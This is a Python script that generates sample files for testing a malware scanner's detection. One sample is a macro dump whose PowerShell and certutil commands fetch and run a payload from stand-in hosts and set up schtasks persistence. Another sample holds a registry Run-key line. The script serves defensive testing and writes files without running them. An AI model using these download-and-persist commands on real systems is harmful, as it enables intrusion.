"""Generate the demo sample files used for the Milestone 1 walkthrough.

All samples are harmless text / random bytes. None is real malware and none
contains the EICAR string (so local antivirus will not quarantine them).

Run:  python demo/generate_samples.py
"""

import random
from pathlib import Path

OUT = Path(__file__).parent / 'samples'
OUT.mkdir(exist_ok=True)


def write(name: str, data: bytes) -> None:
    (OUT / name).write_bytes(data)
    print(f'  {name:32} {len(data):>8} bytes')


print('Writing demo samples to', OUT)

# 1. Clean file -> low risk / Likely Benign
write(
    'clean_notes.txt',
    b'Project meeting notes\n\n- Review Q3 roadmap\n- Assign frontend tasks\n'
    b'- Book demo room for Friday\n- Follow up with the design team\n',
)

# 2. Dropper script -> high risk / Potential Downloader Malware
write(
    'suspicious_macro_dump.txt',
    b'Sub AutoOpen()\n'
    b"  Shell \"powershell -WindowStyle Hidden -EncodedCommand SQBFAFgA\"\n"
    b'  ' b"IEX (New-Object Net.WebClient).DownloadString('http://cdn.malicious-example.com/stage2.ps1')\n"
    b"  Shell \"cmd.exe /c certutil -urlcache -f http://185.220.101.45/payload.exe %TEMP%\\p.exe\"\n"
    b"  Shell \"schtasks /create /tn UpdaterTask /tr %TEMP%\\p.exe /sc onlogon\"\n"
    b'End Sub\n',
)

# 3. Extension disguise -> .exe name, plain-text content, suspicious strings
write(
    'invoice_2026.pdf.exe',
    b'This looks like a document but the file name claims to be an executable.\n'
    b'rundll32.exe shell32.dll,Control_RunDLL\n'
    b'reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v svc /d payload\n',
)

# 4. Known signature hit -> exact bytes registered in data/signatures.json
write('known_demo_trojan.bin', b'ThreatLens DEMO trojan sample - not real malware - id 0001')

# 5. Packed / high-entropy binary with an MZ header
rng = random.Random(1337)
write('packed_blob.bin', b'MZ' + bytes(rng.randrange(256) for _ in range(4096)))

# 6. Process-injection API strings -> YARA Windows_Process_Injection_APIs
write(
    'injector_strings.txt',
    b'imports:\nVirtualAllocEx\nWriteProcessMemory\nCreateRemoteThread\n'
    b'NtUnmapViewOfSection\nSetThreadContext\n',
)

print('\nExpected results:')
print('  clean_notes.txt          -> LOW    (Likely Benign)')
print('  suspicious_macro_dump.txt -> HIGH   (Potential Downloader Malware)')
print('  invoice_2026.pdf.exe      -> MEDIUM (extension mismatch + LOLBins)')
print('  known_demo_trojan.bin     -> HIGH   (Known Trojan - signature match)')
print('  packed_blob.bin           -> LOW/MED (likely packed, high entropy)')
print('  injector_strings.txt      -> MEDIUM (YARA: process injection APIs)')
